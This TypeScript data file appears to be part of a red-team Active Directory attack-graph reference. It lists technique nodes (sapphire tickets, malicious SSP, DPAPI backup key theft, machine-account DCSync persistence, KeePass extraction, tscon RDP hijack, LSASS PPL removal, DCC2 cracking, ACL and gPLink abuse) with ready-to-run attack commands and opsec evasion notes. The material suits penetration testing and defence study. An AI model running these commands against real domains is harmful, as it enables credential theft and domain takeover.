import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { mitre, r } from '../lib';

/** Persistence, credential-dumping, and ACL-abuse extras (web-verified). */
export const adPersistCredNodes: TechniqueNodeDef[] = [
  {
    id: 'sapphire-ticket',
    label: 'Sapphire Ticket',
    phase: 'persistence',
    needs: 'domain-admin',
    summary: "Request a real TGT, then swap in a privileged user's PAC.",
    description:
      'The stealthiest golden/diamond variant. Golden forges a PAC and diamond edits the issued one; sapphire requests a legitimate TGT and substitutes the PAC of a privileged user obtained via the S4U2self + U2U extensions. Every element is legitimately issued through a standard request flow, so it resists golden/diamond detections better than either. Still requires the krbtgt key.',
    tools: [{ name: 'ticketer (Impacket)', url: 'https://github.com/fortra/impacket' }],
    commands: [
      { label: 'Request a sapphire ticket', code: r`ticketer.py -request -impersonate 'Administrator' -domain domain.local -user user -password pass -aesKey <KRBTGT_AES256> -user-id 1115 -domain-sid <SID> baduser`, lang: 'bash' },
    ],
    mitre: mitre('T1558'),
    references: [{ label: 'Unit 42, Next-Gen Kerberos Attacks (Sapphire/Diamond)', url: 'https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/' }, { label: 'The Hacker Recipes, Sapphire tickets', url: 'https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire' }, { label: 'Impacket PR #1411, ticketer.py Sapphire tickets by ShutdownRepo', url: 'https://github.com/fortra/impacket/pull/1411' }],
    requires: ['krbtgt key (NT hash or AES)', 'Valid domain credentials to request the base TGT'],
    opsec: 'A real AS-REQ precedes it and the PAC belongs to a genuine privileged user (via S4U2self+U2U), so it lacks the forged-PAC anomalies hunters look for. Prefer the AES256 krbtgt key.',
  },
  {
    id: 'custom-ssp',
    label: 'Custom SSP / memssp',
    phase: 'persistence',
    needs: 'local-admin',
    summary: 'Register a malicious SSP to log plaintext credentials.',
    description: r`A Security Support Provider is a DLL loaded into LSASS that participates in authentication. Register a malicious SSP to log every credential that authenticates locally in cleartext: drop mimilib.dll and APPEND it to the LSA Security Packages registry value (survives reboot), or load it in-memory via mimikatz misc::memssp (no disk artifact, lost on reboot). The registry/mimilib.dll method logs to C:\Windows\System32\kiwissp.log; in-memory memssp logs to C:\Windows\System32\mimilsa.log.`,
    tools: [{ name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' }],
    commands: [
      { label: 'In-memory SSP (lost on reboot)', code: r`privilege::debug
misc::memssp`, lang: 'text' },
      { label: 'Persistent SSP via registry (stage mimilib.dll in System32, then APPEND it to the existing packages)', code: r`copy mimilib.dll C:\Windows\System32\
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f`, lang: 'cmd' },
    ],
    mitre: mitre('T1547.005'),
    references: [
      { label: 'Pentestlab, Persistence - Security Support Provider', url: 'https://pentestlab.blog/2019/10/21/persistence-security-support-provider/' },
      { label: 'HackTricks, Custom SSP', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/custom-ssp.html' },
      { label: 'XPN, Exploring Mimikatz Part 2 - SSP', url: 'https://blog.xpnsec.com/exploring-mimikatz-part-2/' },
    ],
    requires: ['Local admin / SYSTEM on the target (a DC for domain-wide capture)'],
    opsec: "memssp's mimilsa.log under System32 is a well-known IOC. The registry method persists across reboots at the cost of an audited entry in Security Packages. The in-memory method leaves no disk artifact but dies on reboot.",
  },
  {
    id: 'dpapi-domain-backupkey',
    label: 'DPAPI Domain Backup Key',
    phase: 'persistence',
    needs: 'domain-admin',
    summary: "Steal the domain DPAPI backup key to decrypt any user's secrets forever.",
    description:
      "Every user's DPAPI master key is also encrypted with a domain-wide DPAPI backup key held by the DCs. With Domain Admin, extract that RSA private key once and you can decrypt ANY domain user's DPAPI-protected secrets (saved browser/credential-manager passwords, RDP creds, certificates) even after they change their password. The backup key effectively never rotates, so this is durable persistence.",
    tools: [
      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'dpapi.py (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Export the domain backup key (mimikatz)', code: r`lsadump::backupkeys /system:dc01.domain.local /export`, lang: 'powershell' },
      { label: 'Retrieve the backup key (Impacket)', code: r`dpapi.py backupkeys -t domain.local/user:pass@dc01 --export`, lang: 'bash' },
      { label: "Decrypt a user's masterkey with the .pvk", code: r`dpapi.py masterkey -file <masterkey_file> -pvk backup_key.pvk`, lang: 'bash' },
    ],
    mitre: mitre('T1555'),
    references: [{ label: 'DSInternals, Retrieving DPAPI backup keys', url: 'https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/' }],
    requires: ['Domain Admin (or equivalent) to read the backup key from a DC'],
    opsec: 'Extracting the backup key is a one-time, high-value action; the LSARPC/LSAD read (LsaOpenPolicy + LsarRetrievePrivateData against the G$BCKUPKEY_* secrets) from a DC is detectable. Once exfiltrated, all subsequent masterkey decryption is offline and invisible.',
  },
  {
    id: 'computer-account-persist',
    label: 'Computer Account Persistence',
    phase: 'persistence',
    needs: 'domain-user',
    summary: 'Create/own a machine account or grant it privileges for durable access.',
    description:
      'Machine accounts are rarely scrutinised like user accounts, yet their passwords authenticate and DCSync just the same. Create or take over a computer account and make it durable: add it to a privileged group, or set its userAccountControl to SERVER_TRUST_ACCOUNT (0x2000 = 8192), which forces primaryGroupId to 516 (Domain Controllers), and that group holds the DS-Replication-Get-Changes[-All] rights that enable DCSync. Authenticate with the machine-account hash (PtH / S4U2self) for stealthy long-term access.',
    tools: [
      { name: 'Powermad', url: 'https://github.com/Kevin-Robertson/Powermad' },
      { name: 'addcomputer (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'Create a controlled machine account', code: r`New-MachineAccount -MachineAccount Pentestlab -Domain domain.local -DomainController dc.domain.local`, lang: 'powershell' },
      { label: 'Make the machine account a DC (needs DS-Install-Replica on the domain + write on the computer)', code: r`Set-ADComputer Pentestlab -replace @{ "userAccountControl" = 8192 }`, lang: 'powershell' },
      { label: 'Create a controlled machine account (bloodyAD)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 add computer Pentestlab 'ComputerPass123!'`, lang: 'bash' },
      { label: 'Flag it SERVER_TRUST_ACCOUNT so it can DCSync (bloodyAD, needs DS-Install-Replica on the domain + write on the computer)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 add uac 'Pentestlab$' -f SERVER_TRUST_ACCOUNT`, lang: 'bash' },
      { label: 'DCSync as the machine account', code: r`secretsdump.py 'domain.local/Pentestlab$:Password123@dc01' -just-dc`, lang: 'bash' },
    ],
    mitre: mitre('T1098'),
    references: [{ label: 'Pentestlab, Domain Persistence: Machine Account', url: 'https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/' }, { label: 'Dibley (Stealthbits/Netwrix), Server (Un)Trust Account', url: 'https://www.netwrix.com/en/resources/blog/server-untrust-account/' }, { label: 'netwrix, ServerUntrustAccount tool', url: 'https://github.com/netwrix/server-untrust-account' }],
    requires: ['MachineAccountQuota > 0 to create', 'To set SERVER_TRUST_ACCOUNT: DS-Install-Replica (Add/remove replica in domain) on the domain object plus write on the computer object (a delegatable right, not Domain Admin)', 'Group membership changes need write over the target group'],
    opsec: 'Machine-account creation (4741), userAccountControl changes (4742), and privileged group additions (4728) are auditable. A workstation account in Domain Admins or flagged SERVER_TRUST_ACCOUNT is a strong indicator.',
  },
  {
    id: 'keepass-extract',
    label: 'KeePass Extraction',
    phase: 'credential-access',
    needs: 'shell',
    summary: 'Recover a KeePass master key/password from memory or brute force.',
    description:
      'KeePass databases (.kdbx) frequently hold domain and admin credentials. KeeThief extracts the composite master key from a live KeePass.exe process (works while unlocked, no master password); the CVE-2023-32784 dumper recovers the master password from a memory/pagefile/hiberfil dump of KeePass 2.x before 2.54, but it cannot recover the first character (it leaves a near-complete password that usually needs a small brute-force or guess on the missing first char, and the tool can emit a candidate wordlist); or, with the .kdbx alone, keepass4brute brute-forces the master password offline. keepass4brute targets KDBX 4.x (KeePass >= 2.36) specifically; it is a sequential bash loop that shells out to keepassxc-cli per candidate (no GPU, no hash extraction, so slow), and older KDBX should go via keepass2john + hashcat instead. Privilege gradient: the in-memory paths (KeeThief, the CVE-2023-32784 dump) need code execution in the KeePass user\'s context, while the offline brute-force needs only the .kdbx file obtained upstream.',
    tools: [
      { name: 'KeeThief', url: 'https://github.com/GhostPack/KeeThief' },
      { name: 'keepass-password-dumper (CVE-2023-32784)', url: 'https://github.com/vdohney/keepass-password-dumper' },
      { name: 'keepass4brute', url: 'https://github.com/r3nt0n/keepass4brute' },
      { name: 'NetExec (keepass_trigger)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Extract the master key from process memory', code: r`Get-KeePassDatabaseKey`, lang: 'powershell' },
      { label: 'Recover master password from a dump, then emit candidates for the missing first char (CVE-2023-32784)', code: r`dotnet run <KeePass_dump_file>
dotnet run <KeePass_dump_file> <wordlist.txt>`, lang: 'bash' },
      { label: 'Brute-force the .kdbx offline', code: r`./keepass4brute.sh database.kdbx wordlist.txt`, lang: 'bash' },
      { label: 'Inject an export trigger into the user config (waits for next unlock)', code: r`nxc smb <host> -u <u> -p <p> -M keepass_discover
nxc smb <host> -u <u> -p <p> -M keepass_trigger -o ACTION=ADD KEEPASS_CONFIG_PATH=<path>`, lang: 'bash' },
    ],
    mitre: mitre('T1555.005'),
    references: [{ label: 'KeeThief (GhostPack)', url: 'https://github.com/GhostPack/KeeThief' }, { label: 'NVD, CVE-2023-32784', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-32784' }, { label: 'vdohney, keepass-password-dumper original PoC (CVE-2023-32784)', url: 'https://github.com/vdohney/keepass-password-dumper' }],
    requires: ['Local code execution', 'KeeThief: an unlocked KeePass.exe; CVE-2023-32784: a dump of KeePass 2.x < 2.54; keepass4brute: the .kdbx (KDBX 4.x) + a weak master password + keepassxc-cli installed (older KDBX: keepass2john + hashcat)'],
    opsec: 'KeeThief injects a remote thread / shellcode into the signed KeePass.exe to decrypt its memory, which behavioral EDR flags on its own (independent of any dump). The separate CVE-2023-32784 route needs a process/pagefile/hiberfil memory dump, caught by dump-creation and CVE-specific rules. keepass4brute is offline once the .kdbx is exfiltrated. KeePass 2.54+ mitigates CVE-2023-32784.',
  },
  {
    id: 'rdp-session-hijack',
    label: 'RDP Session Hijack (tscon)',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: "As SYSTEM, tscon into another user's RDP session, no password needed.",
    description:
      'From SYSTEM, the native tscon.exe reconnects any existing RDP session (active or disconnected) to your own session without the password or a prompt. Enumerate with query user, then connect to a more privileged session to inherit its interactive token and loaded credentials/tickets, which is quieter than dumping LSASS. A common trick launches tscon via a temporary service so it runs as SYSTEM.',
    tools: [{ name: 'tscon.exe (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon' }, { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' }],
    commands: [
      { label: 'List sessions and IDs', code: r`query user`, lang: 'cmd' },
      { label: 'As SYSTEM, hijack session 2 to the console', code: r`tscon 2 /dest:console`, lang: 'cmd' },
      { label: 'Get SYSTEM, then tscon via a service', code: r`sc create sesshijack binpath= "cmd.exe /k tscon 2 /dest:console"
sc start sesshijack`, lang: 'cmd' },
      { label: 'List interactive sessions to hijack (NetExec)', code: r`nxc smb <host> -u user -p pass --qwinsta`, lang: 'bash' },
      { label: 'Related (not tscon): remote session impersonation via a scheduled task run as a logged-on user (NetExec schtask_as)', code: r`nxc smb <host> -u user -p pass -M schtask_as -o USER=victim CMD='whoami'`, lang: 'bash' },
    ],
    mitre: mitre('T1563.002'),
    references: [
      { label: 'HackTricks, RDP Sessions Abuse', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/rdp-sessions-abuse.html' },{ label: 'ired.team, RDP Hijacking with tscon', url: 'https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement' },{ label: 'Korznikov, Passwordless RDP Session Hijacking (2017)', url: 'https://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html' }],
    requires: ['Local admin on the host (tscon runs as SYSTEM, e.g. via a temporary service)', 'An existing RDP session belonging to another (ideally more privileged) user'],
    opsec: 'Detected by tscon.exe spawned as SYSTEM without a password. The service route logs both 7045 (System) and 4697 (Security), and a service whose binPath contains "tscon ... /dest:" is a high-signal published signature. The direct interactive tscon command (no service) generates no 7045, so it is caught by process/command-line telemetry instead. The hijacked user may notice their session disconnected/reconnected. No credential material is written to disk.',
  },
  {
    id: 'lsass-ppl-bypass',
    label: 'LSASS PPL / LSA Protection Bypass',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Defeat RunAsPPL with mimikatz mimidrv to dump LSASS.',
    description: r`RunAsPPL runs LSASS as a Protected Process Light, blocking normal handle access and standard dumping. Mimikatz ships a signed kernel driver, mimidrv.sys: load it with !+, then !processprotect /process:lsass.exe /remove strips the protection flag so sekurlsa::logonpasswords works. Currency caveat: mimidrv.sys is on Microsoft's vulnerable-driver blocklist (default-on for all Windows 11 devices since 22H2 (the 2022 update), and additionally enforced when HVCI / Smart App Control / S mode is active, e.g. on Server, except Windows Server 2016), so on hardened hosts it is blocked at load and you fall back to a fresh BYOVD driver or disabling RunAsPPL in the registry and rebooting. On a legacy host without the blocklist the mimidrv route still works.`,
    tools: [{ name: 'Mimikatz (mimidrv.sys)', url: 'https://github.com/gentilkiwi/mimikatz' }],
    commands: [
      { label: 'Load mimidrv, remove LSASS protection, dump (run inside the mimikatz console)', code: r`privilege::debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords`, lang: 'text' },
      { label: 'Disable RunAsPPL via registry (needs reboot)', code: r`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f`, lang: 'powershell' },
    ],
    mitre: mitre('T1003.001'),
    references: [
      { label: 'HackTricks, Credentials Protections (RunAsPPL/LSA)', url: 'https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/credentials-protections.html' },{ label: 'itm4n, LSA Protection (RunAsPPL)', url: 'https://itm4n.github.io/lsass-runasppl/' },{ label: 'Microsoft, recommended driver block rules', url: 'https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules' }],
    requires: ['Local admin / SYSTEM', 'Ability to load a kernel driver (mimidrv.sys) or set the RunAsPPL registry value'],
    opsec: 'Very high-signal: loading mimidrv.sys writes a known-malicious signed driver and registers a kernel service, and EDR/AV detect both. The registry route (RunAsPPL=0) needs a reboot and is itself audited.',
  },
  {
    id: 'mscache-crack',
    label: 'Crack MSCacheV2 (DCC2)',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Crack cached domain logon credentials (DCC2) offline.',
    description:
      'Domain-joined hosts cache the last domain logons as MSCacheV2 (DCC2) so users can log in when the DC is unreachable. With SYSTEM, dump them from the SECURITY hive (secretsdump LOCAL, or mimikatz lsadump::cache). DCC2 cannot be passed (no PtH/PtT), so it must be cracked offline: PBKDF2-HMAC-SHA1, default 10240 iterations (configurable higher via the MSCacheV2 iteration GPO / NL$IterationCount), so slow, but weak passwords still fall and yield valid domain credentials.',
    tools: [
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'hashcat', url: 'https://hashcat.net/hashcat/' },
    ],
    commands: [
      { label: 'Dump DCC2 from saved hives', code: r`secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`, lang: 'bash' },
      { label: 'Dump cached creds (mimikatz; run as SYSTEM)', code: r`privilege::debug
token::elevate
lsadump::cache`, lang: 'text' },
      { label: 'Crack DCC2 (hashcat mode 2100; the iteration field must match the count from the dump, e.g. $DCC2$<iterations>#user#hash, not a hardcoded 10240)', code: r`hashcat -m 2100 '$DCC2$10240#username#hash' rockyou.txt -r rules/best64.rule`, lang: 'bash' },
    ],
    mitre: mitre('T1003.005'),
    references: [{ label: 'ired.team, Dumping & cracking mscash', url: 'https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials' }],
    requires: ['Local admin / SYSTEM to read the SECURITY hive', 'A crackable password (DCC2 is slow)'],
    opsec: 'Dumping is the same SECURITY-hive read as SAM/LSA secrets; cracking is offline and invisible. The high iteration count makes brute force expensive, so prioritise targeted wordlists.',
  },
  {
    id: 'acl-writeowner',
    aliases: ['Owns', 'WriteOwnerLimitedRights', 'OwnsLimitedRights', 'OwnsRaw', 'WriteOwnerRaw'],
    label: 'WriteOwner',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Set yourself as owner of an object, then grant full rights.',
    description:
      'WriteOwner over a target lets you set its owner to a principal you control. The owner implicitly holds WriteDacl (by default), so once you own it you grant yourself GenericAll (or DCSync on the domain object) and take it over.',
    tools: [
      { name: 'owneredit (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'Set owner (bloodyAD)', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 set owner <target> <attacker>', lang: 'bash' },
      { label: 'Set owner (Impacket)', code: r`owneredit.py -action write -new-owner 'attacker' -target 'victim' domain.local/user:pass`, lang: 'bash' },
    ],
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound WriteOwner edge', url: 'https://bloodhound.specterops.io/resources/edges/write-owner' },{ label: 'The Hacker Recipes, Grant ownership', url: 'https://www.thehacker.recipes/ad/movement/dacl/grant-ownership' }],
    requires: ['WriteOwner over the target object'],
    opsec: 'The owner change and subsequent DACL write are auditable (4662/5136). Restore the original owner and remove added ACEs after use.',
  },
  {
    id: 'acl-writedacl',
    label: 'WriteDacl',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Rewrite a DACL → grant yourself any right on the object.',
    description:
      'WriteDacl lets you modify a target object\'s DACL directly. Add an ACE granting yourself GenericAll over a user/computer (then take it over), or, when the target is the domain object, grant the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights that enable DCSync. One ACL write can convert a low-priv foothold into the ability to replicate every secret in the domain.',
    tools: [
      { name: 'dacledit (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'Grant DCSync via WriteDacl (bloodyAD)', code: r`bloodyAD --host dc01 -d domain.local -u user -p pass add dcsync attacker`, lang: 'bash' },
      { label: 'Grant DCSync rights (Impacket)', code: r`dacledit.py -action write -rights DCSync -principal attacker -target-dn 'DC=domain,DC=local' domain.local/user:pass -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    mitre: mitre('T1098'),
    references: [
      { label: 'HackTricks, Abusing AD ACLs/ACEs', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html' },
      { label: 'SpecterOps, BloodHound WriteDacl edge', url: 'https://bloodhound.specterops.io/resources/edges/write-dacl' },{ label: 'The Hacker Recipes, Grant rights (DACL)', url: 'https://www.thehacker.recipes/ad/movement/dacl/grant-rights' },
      { label: 'Robbins/Schroeder/Christensen, An ACE Up the Sleeve (Black Hat USA 2017)', url: 'https://blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors.pdf' }],
    requires: ['WriteDacl over the target object (an object, or the domain head for DCSync)'],
    opsec: 'DACL modifications generate directory-change events (4662/5136); granting DS-Replication rights is high-fidelity. Remove the added ACE immediately after use.',
  },
  {
    id: 'acl-gplink-ou',
    aliases: ['GPLink', 'WriteGPLink'],
    label: 'Write gPLink on OU',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Link a malicious GPO to an OU via the gPLink attribute.',
    description:
      'WriteGPLink (Manage GP-Link) over an OU/domain/site lets you edit its gPLink attribute to link a GPO of your choosing, applying it to every user and computer under the OU, including nested ones. Combined with a GPO you can edit (or a fake GPO server via OUned.py), this delivers a malicious immediate task / local-admin change to whole OUs. It controls which GPO an OU applies; it does not itself edit a GPO.',
    tools: [
      { name: 'pyGPOAbuse', url: 'https://github.com/Hackndo/pyGPOAbuse' },
      { name: 'OUned.py', url: 'https://github.com/synacktiv/OUned' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'Stage a payload in a controllable GPO', code: r`pygpoabuse.py domain.local/user -hashes :<NTHASH> -gpo-id <GPO-GUID>`, lang: 'bash' },
      { label: 'Link the GPO to the target OU (GroupPolicy RSAT)', code: r`New-GPLink -Name 'Evil GPO' -Target 'OU=Servers,DC=domain,DC=local'`, lang: 'powershell' },
      { label: 'Write gPLink to link the GPO to the OU (bloodyAD)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 set object 'OU=Servers,DC=domain,DC=local' gPLink -v 'cn={GPO-GUID},cn=policies,cn=system,DC=domain,DC=local'`, lang: 'bash' },
    ],
    mitre: mitre('T1484.001'),
    references: [
      { label: 'SpecterOps, A Red Teamer\'s Guide to GPOs and OUs', url: 'https://specterops.io/blog/2018/02/26/a-red-teamers-guide-to-gpos-and-ous/' },{ label: 'BloodHound, WriteGPLink', url: 'https://bloodhound.specterops.io/resources/edges/write-gp-link' }],
    requires: ['WriteGPLink over the target OU/domain/site', 'A controllable/linkable GPO (editable GPO, or a fake GPO server via OUned.py)'],
    opsec: 'The gPLink write is a directory change (5136), but that event only fires if Directory Service Changes SACL auditing is enabled on the OU. Affected hosts run gpupdate and apply the policy: an immediate task runs as SYSTEM (computer policy) or as the logged-on user (user policy). Unlink and clean up promptly.',
  },
];

export const adPersistCredEdges: AttackEdge[] = [
  // Persistence (category ad-cat-persistence created in ad-categories.ts)
  { source: 'persist-forgery', target: 'sapphire-ticket' },
  { source: 'persist-implant', target: 'custom-ssp' },
  { source: 'persist-fed', target: 'dpapi-domain-backupkey' },
  { source: 'persist-backdoor', target: 'computer-account-persist' },
  // Persistence that re-grants domain dominance (loops back; goal nodes auto-dash):
  { source: 'adminsdholder', target: 'domain-admin', label: 'SDProp re-grants control' },
  { source: 'computer-account-persist', target: 'dcsync', label: 'SERVER_TRUST_ACCOUNT → replicate' },
  { source: 'krbtgt-hash', target: 'sapphire-ticket' },
  { source: 'sapphire-ticket', target: 'pass-the-ticket' },
  // Credential dumping (category ad-cat-cred-dump)
  { source: 'keepass-extract', target: 'lateral-movement-cme', label: 'vault creds' },
  { source: 'rdp-session-hijack', target: 'lateral-movement-cme', label: 'as hijacked user' },
  // PPL bypass ENABLES an LSASS dump (it doesn't extract creds itself).
  { source: 'lsass-ppl-bypass', target: 'dump-lsass', label: 'PPL removed → dump' },
  { source: 'mscache-crack', target: 'valid-domain-creds', label: 'cracked domain password' },
  // ACL extras (WriteOwner/WriteDacl now hang off acl-tgt-control; acl-gplink-ou
  // off acl-tgt-policy — see ad-categories.ts / ad-additions.ts for those edges).
  // WriteOwner → take ownership → WriteDacl → grant yourself GenericAll → then the
  // object-appropriate abuse. DCSync is just ONE GenericAll outcome (domain object),
  // not what WriteDacl/WriteOwner lead to directly.
  { source: 'acl-writeowner', target: 'acl-writedacl', label: 'own → rewrite DACL' },
  { source: 'acl-writedacl', target: 'acl-genericall', label: 'grant yourself control' },
  { source: 'acl-gplink-ou', target: 'gpo-abuse' },
];
